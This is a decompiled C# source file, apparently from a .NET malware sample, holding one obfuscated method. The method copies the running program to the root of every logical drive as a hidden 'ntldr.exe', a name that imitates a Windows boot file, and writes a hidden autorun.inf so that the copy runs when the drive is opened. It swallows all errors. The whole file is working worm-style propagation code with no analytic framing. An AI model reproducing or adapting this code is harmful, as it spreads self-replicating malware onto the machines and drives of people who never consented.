using System;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

[StandardModule]
internal sealed class Class15
{
	public static void smethod_0()
	{
		try
		{
			string programFiles = ((ServerComputer)Class1.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				if (!File.Exists(programFiles + "ntldr.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "ntldr.exe");
				}
				StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open = ntldr.exe");
				streamWriter.WriteLine("shellexecute=ntldr.exe");
				streamWriter.Close();
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "ntldr.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
